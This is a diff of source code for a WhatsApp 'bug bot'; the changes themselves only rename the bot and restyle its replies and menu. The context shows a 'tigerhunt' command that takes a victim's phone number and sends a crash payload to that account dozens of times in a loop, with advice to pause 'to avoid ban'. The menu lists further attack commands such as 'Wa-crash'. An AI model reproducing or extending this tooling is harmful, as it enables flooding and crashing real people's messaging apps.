@@ -959,13 +959,13 @@ break
 		
 //=================================================//
 case 'tigerhunt': {
-if (!isCreator) return reply("Only Tiger-radiation-bugbot owner can use this command")
+if (!isCreator) return reply("Only TIGERBOT owner can use this command")
 if (!args[0]) return reply(`Use like .${command} 254392784527`)
 let tgt = args[0]
 let qt = tgt.replace(/[^0-9]/g, "")
 if (qt.startsWith('0')) return reply(`Number must be in international format like \n\nExample : .${command} 254392784527`)
 let target = qt + '@s.whatsapp.net'
-await reply("Processing 🐉")
+await reply("I HAVE NO MERCY💔⚠️")
 for (let j = 0; j < 40; j++) {
 await ngeloc(target, force)
 await ngeloc(target, force)
@@ -987,7 +987,7 @@ await ngeloc(target, force)
 await ngeloc(target, force)
 await ngeloc(target, force)
 }
-await reply(`Successfully Send Bug to ${target} Using ${command}. 🐉\n\n Wait some minutes to avoid ban.`)
+await reply(`Successfully Send Bug to ${target} Using ${command}. ✅\n\n Wait some minutes to avoid ban.`)
 }
 break
 //========================+=======
@@ -1065,19 +1065,19 @@ case 'bugmenu': {
   ❤️‍🔥 𝐔𝐬𝐞𝐫 : ${pushname}}
   ⚠️ 𝐂𝐨𝐧𝐭𝐚𝐜𝐭 : @${m.sender.split('@')[0]}
 
-┏▰▱▰▱▰▱▰▱▰▱▰▱▰▱
-◊☬ 𝐄𝐯𝐢𝐥-𝐭𝐢𝐠𝐞𝐫 (254𝐱𝐱𝐱𝐱𝐱,𝐚𝐦𝐨𝐮𝐧𝐭)
-┃☬ 𝐑.𝐈.𝐏 (254𝐱𝐱𝐱𝐱𝐱,𝐚𝐦𝐨𝐮𝐧𝐭)
-◆☬ 𝐖𝐚-𝐜𝐫𝐚𝐬𝐡(254𝐱𝐱𝐱𝐱𝐱,𝐚𝐦𝐨𝐮𝐧𝐭)
-┃☬ 𝐅𝐚𝐥𝐥𝐞𝐧-𝐫𝐚𝐝𝐢𝐚𝐭𝐢𝐨𝐧 (254𝐱𝐱𝐱𝐱𝐱,𝐚𝐦𝐨𝐮𝐧𝐭)
-◊☬ 𝐎𝐮𝐭-𝐨𝐟-𝐥𝐨𝐯𝐞 (254𝐱𝐱𝐱𝐱𝐱,𝐚𝐦𝐨𝐮𝐧𝐭)
-┃☬ 𝐁𝐢𝐠𝐝𝐢𝐜𝐤 (𝐝𝐢𝐫𝐞𝐜𝐭 𝐛𝐮𝐠 )
-◆☬ 𝐃𝐫𝐚𝐠𝐨𝐧𝐥𝐞𝐚𝐝
-┃☬ 𝐄𝐯𝐢𝐥𝐥𝐢𝐬𝐭
-◊✇ 𝐓𝐢𝐠𝐞𝐫𝐡𝐮𝐧𝐭 (254xxxxx)
-┗▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰
+▰▱▰▱▰▱▰▱▰▱▰▱▰▱
+🚨☬ 𝐄𝐯𝐢𝐥-𝐭𝐢𝐠𝐞𝐫 (254𝐱𝐱𝐱𝐱𝐱,𝐚𝐦𝐨𝐮𝐧𝐭)
+🚨☬ 𝐑.𝐈.𝐏 (254𝐱𝐱𝐱𝐱𝐱,𝐚𝐦𝐨𝐮𝐧𝐭)
+🚨☬ 𝐖𝐚-𝐜𝐫𝐚𝐬𝐡(254𝐱𝐱𝐱𝐱𝐱,𝐚𝐦𝐨𝐮𝐧𝐭)
+🚨☬ 𝐅𝐚𝐥𝐥𝐞𝐧-𝐫𝐚𝐝𝐢𝐚𝐭𝐢𝐨𝐧 (254𝐱𝐱𝐱𝐱𝐱,𝐚𝐦𝐨𝐮𝐧𝐭)
+🚨☬ 𝐎𝐮𝐭-𝐨𝐟-𝐥𝐨𝐯𝐞 (254𝐱𝐱𝐱𝐱𝐱,𝐚𝐦𝐨𝐮𝐧𝐭)
+🚨☬ 𝐁𝐢𝐠𝐝𝐢𝐜𝐤 (𝐝𝐢𝐫𝐞𝐜𝐭 𝐛𝐮𝐠 )
+🚨☬ 𝐃𝐫𝐚𝐠𝐨𝐧𝐥𝐞𝐚𝐝
+🚨☬ 𝐄𝐯𝐢𝐥𝐥𝐢𝐬𝐭
+🚨☬ 𝐓𝐢𝐠𝐞𝐫𝐡𝐮𝐧𝐭 (254xxxxx)
+▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰
 
-☬𝐀𝐑𝐋𝐎𝐃𝐑𝐀𝐆𝐎𝐍 
+©𝐀𝐑𝐋𝐎𝐃𝐑𝐀𝐆𝐎𝐍 
  
 `
 let hiks = {
